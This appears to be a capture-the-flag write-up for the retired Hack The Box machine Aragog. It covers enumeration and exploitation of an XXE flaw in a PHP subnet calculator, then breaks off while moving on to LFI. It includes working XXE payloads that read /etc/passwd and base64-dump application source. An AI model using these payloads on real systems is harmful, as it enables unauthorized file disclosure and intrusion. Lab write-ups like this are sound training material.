# Aragog

This is the write-up for the box Aragog that got retired at the 21st July 2018.
My IP address was 10.10.14.34 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.78    aragog.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/aragog.nmap 10.10.10.78
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking FTP (Port 21)

As anonymous login on FTP is allowed, lets download the _test.txt_ and look at the contents:
```xml
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

This does not give any information about the box but it could be a hint because it is in **XML** format.

## Checking HTTP (Port 80)

On the web page there is the Apache2 default page, so we should look for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.78 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds _hosts.php_ where it says one sentence:
> There are 4294967294 possible hosts for

Sending it to a proxy like **Burpsuite** and trying out, if it accepts data by changing the HTTP request to _POST_ and appending some data at the end of the request. As we got data from the file on FTP in XML format, appending that seems like the way to go:
```markdown
POST /hosts.php HTTP/1.1
Host: 10.10.10.78
()...)

<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

Now it shows another response from the web service:
> There are 62 possible hosts for 255.255.255.192

So this application is a subnet calculator that reads XML files.
One way to attack XML is with **XML External Entities** or in short **XXE**.

### Analyzing the XXE

Before exploiting the XXE, we should test for it with this basic XML string:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Test"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

Now the string between the _subnet_mask_ tag gets replaced by the variable _&example_ whose value is _Test_ and the response becomes:
> There are 4294967294 possible hosts for Test

With this method, it is possible to retrieve system files with the _SYSTEM_ command:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

This displays the contents of the _/etc/passwd_ file.
There are two non-default users on the box that could be useful later called _cliff_ and _florian_.

Also interesting is the content of the _hosts.php_:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

This outputs the contents of the file as _Base64-decoded_, which can be decoded to read the source code:
```markdown
echo PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo= | base64 -d > hosts.php
```

The source code reveals that it is possible to load **DTD files** which can be used to gain code execution with XML.
For this to work, we need to find a way to create such a file on the system.

So lets search for a **Local File Inclusion** to accomplish this.

### Looking for LFI

The [LFISuite](https://github.com/D35m0nd142/LFISuite) has tools and lists to automatically search for LFI.
I will only use the _pathtotest.txt_ file as the wordlist and write a Python script that can be found in this repository.
